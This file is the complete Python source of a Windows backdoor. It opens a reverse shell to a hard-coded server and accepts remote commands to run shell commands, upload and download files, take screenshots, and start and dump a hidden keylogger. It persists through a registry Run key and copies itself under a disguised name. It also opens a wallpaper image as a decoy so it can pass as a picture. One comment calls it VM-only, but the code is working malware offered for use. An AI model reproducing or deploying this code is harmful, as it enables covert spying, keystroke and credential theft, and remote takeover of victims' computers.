#!/usr/bin/python3

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss
import threading

#  Simple Keylogger
keylogger_path = os.environ["appdata"] + "\\processmanager.txt"

def keylogger_start():
    try:
        import pynput
        from pynput.keyboard import Listener

        def write_log(key):
            try:
                k = str(key.char)
            except AttributeError:
                k = str(key)
            with open(keylogger_path, "a") as f:
                f.write(k)

        with Listener(on_press=write_log) as listener:
            listener.join()
    except ImportError:
        print("[!] pynput module not installed.")

# Socket Communication 
def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data += sock.recv(1024).decode()
            return json.loads(data)
        except ValueError:
            continue

# Helper Functions
def is_admin():
    global admin
    try:
        os.listdir(os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'Temp'))
    except:
        admin = "[!] User Privileges!"
    else:
        admin = "[+] Administrator Privileges!"

def screenshot():
    with mss() as sct:
        sct.shot()

def download(url):
    r = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as f:
        f.write(r.content)

#Reverse Shell 
def shell():
    while True:
        command = reliable_recv()

        if command == "q":
            break

        elif command == "help":
            help_text = """
download path        --> Download a File From Target PC
upload path          --> Upload A File To Target PC
get url              --> Download File From URL
start path           --> Start A Program
screenshot           --> Take Screenshot
check                --> Check Admin Privileges
keylog_start         --> Start Keylogger
keylog_dump          --> Dump Keylogger File
q                    --> Exit
"""
            reliable_send(help_text)

        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                reliable_send("[!] Directory not found")

        elif command[:8] == "download":
            try:
                with open(command[9:], "rb") as f:
                    reliable_send(base64.b64encode(f.read()).decode())
            except:
                reliable_send("[!] File not found")

        elif command[:6] == "upload":
            with open(command[7:], "wb") as f:
                file_data = reliable_recv()
                f.write(base64.b64decode(file_data))

        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] File Downloaded")
            except:
                reliable_send("[!] Download Failed")

        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as f:
                    reliable_send(base64.b64encode(f.read()).decode())
                os.remove("monitor-1.png")
            except:
                reliable_send("[!] Screenshot Failed")

        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Program Started")
            except:
                reliable_send("[!] Failed to Start Program")

        elif command[:5] == "check":
            is_admin()
            reliable_send(admin)

        elif command[:12] == "keylog_start":
            t1 = threading.Thread(target=keylogger_start)
            t1.start()
            reliable_send("[+] Keylogger Started")

        elif command[:11] == "keylog_dump":
            try:
                with open(keylogger_path, "r") as f:
                    reliable_send(f.read())
            except:
                reliable_send("[!] Keylogger file not found")

        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result.decode())
            except:
                reliable_send("[!] Command execution failed")

# Persistence (Optional, only for local VM testing)
location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call(
        f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "{location}"',
        shell=True
    )

# Open Example Image
file_name = getattr(sys, "_MEIPASS", os.getcwd()) + "\\Dragon-Wallpaper-Chinese.jpg"
try:
    subprocess.Popen(file_name, shell=True)
except:
    pass

# Socket Setup 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try:
        sock.connect(("192.168.1.9", 54321))  # Change to your server IP & port
        break
    except:
        time.sleep(10)

shell()
